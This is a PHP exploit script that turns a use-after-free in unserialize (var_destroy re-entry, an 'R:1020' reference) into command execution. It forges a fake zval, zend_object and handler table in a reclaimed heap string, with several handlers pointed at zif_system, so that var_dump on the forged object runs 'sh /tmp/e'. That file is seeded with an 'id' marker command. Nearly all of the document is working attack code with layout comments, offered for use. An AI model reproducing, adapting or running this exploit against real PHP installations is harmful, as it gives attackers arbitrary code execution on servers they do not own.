<?php
// vdR3: RCE — forged zend_object -> handlers -> zif_system("sh /tmp/e")
// via the vd3 var_destroy re-entry UAF (read side = fake-zval injection).
//
// R:1020 -> var_access returns P (from reclaim-string bytes) -> R-rule
// ZVAL_NEW_REF copies the 16 bytes at *P into a zend_reference handed to
// userland: *P is a FAKE ZVAL {value=OBJ, type_info=IS_OBJECT} -> $r1 is a
// live PHP "object" whose zend_object, class_entry, handler table, execute-
// data and argument string are ALL bytes of our reclaim string.
// var_dump($r1) invokes handlers->get_class_name(obj) = zif_system with
// rdi = obj = a fully crafted fake execute_data: num_args=1 at +44, arg1
// = zend_string "sh /tmp/e" at +80/+96. /tmp/e contains the marker command.
//
// usage: php vdR3_call.php <chunk> <base>   (16-digit fixed width)
$CHUNK = (int)($argv[1] ?? 0);
$BASE  = (int)($argv[2] ?? 0);
$ZIF_SYSTEM = $BASE + 0x523c60;

@unlink('/tmp/pwned_zero4');
file_put_contents('/tmp/e', "id > /tmp/pwned_zero4\n");

class D {
    public function __destruct() {
        global $CHUNK, $BASE, $ZIF_SYSTEM;
        $V = function ($off) { global $CHUNK; return $CHUNK + 24 + $off; };
        $OBJ = $V(32); $HT = $V(600); $CE = $V(1600); $SMINI = $V(128);
        $pat  = pack('P', $V(16));                 // val[0..8] = P1 -> fz @16
        $pat .= str_repeat("\x00", 8);             // val[8..16]
        $pat .= pack('PVV', $OBJ, 8, 0);           // fz @16: {value=OBJ, IS_OBJECT}
        // OBJ @32 (also the fake zend_execute_data, rdi):
        $pat .= pack('VV', 1, 8);                  // +0  gc: refcount=1, type=IS_OBJECT
        $pat .= pack('VV', 0x1337, 0);             // +8  handle, extra_flags
        $pat .= pack('P', $CE);                    // +16 ce -> zero region
        $pat .= pack('P', $HT);                    // +24 handlers -> fake table
        $pat .= pack('P', 0);                      // +32 properties
        $pat .= pack('P', 0x0000000100000000);     // +40 properties_table[0].value hi=dword1 (num_args@+44)
        $pat .= str_repeat("\x00", 32);            // +48..80 prev/symbol_table/run_time_cache/extra
        $pat .= pack('PVV', $SMINI, 6, 0);         // +80 ZEND_CALL_ARG(ex,1) = {str, IS_STRING}
        $pat .= pack('VV', 1, 0x16);               // +96 mini zend_string gc {rc=1, GC_STRING=0x16}
        $pat .= pack('P', 0);                      // +104 h
        $pat .= pack('P', 9);                      // +112 len=9
        $pat .= "sh /tmp/e\x00";                   // +120 val (10 bytes, ends at pat+162)
        $pat .= str_repeat("\x00", 600 - 162);     // pad to 600
        // HANDLERS @600 (zend_object_handlers):
        $h  = pack('VV', 0, 0);                    // offset + pad
        $h .= pack('P', 0);                        // free_obj
        $h .= pack('P', $ZIF_SYSTEM);              // dtor_obj = zif_system
        $h .= str_repeat("\x00", 136 - 24);        // .. to get_class_name
        $h .= pack('P', $ZIF_SYSTEM);              // get_class_name = zif_system
        $h .= str_repeat("\x00", 160 - 144);       // .. to get_debug_info
        $h .= pack('P', $ZIF_SYSTEM);              // get_debug_info = zif_system (var_dump calls this first; rsi=&is_temp = writable stack)
        $h .= str_repeat("\x00", 208 - 168);       // rest of table
        $pat .= $h;                                // 600..808
        $pat .= str_repeat("\x00", 1600 - 808);    // CE region zeros 808..1600
        // CE @1600: zeros; pad pattern to 2040 total:
        $pat .= str_repeat("\x00", 2040 - 1600);
        $s = str_repeat($pat, 4);                  // 8160-byte reclaim (single alloc)
        echo "forged: OBJ=0x", dechex($OBJ), " HT=0x", dechex($HT),
             " zif_system=0x", dechex($ZIF_SYSTEM), "\n";
        $r1 = @unserialize('R:1020;');             // $r1 = ref -> fake object
        echo "TRIGGERING var_dump(\$r1) -> handlers->get_class_name(obj)=zif_system(fake_execute_data)\n";
        var_dump($r1);                             // CALL
        echo "SURVIVED-CALL\n";
    }
}
$els = [];
for ($k = 0; $k <= 1017; $k++) { $els[] = "i:$k;i:1;"; }
$els[] = 'i:9998;O:1:"D":0:{}';
$els[] = 'i:9998;i:5;';
$payload = 'a:1020:{' . implode('', $els) . '}';
$r = unserialize($payload);
echo "outer ok=";
var_dump($r !== false);
echo "SCRIPT-END\n";
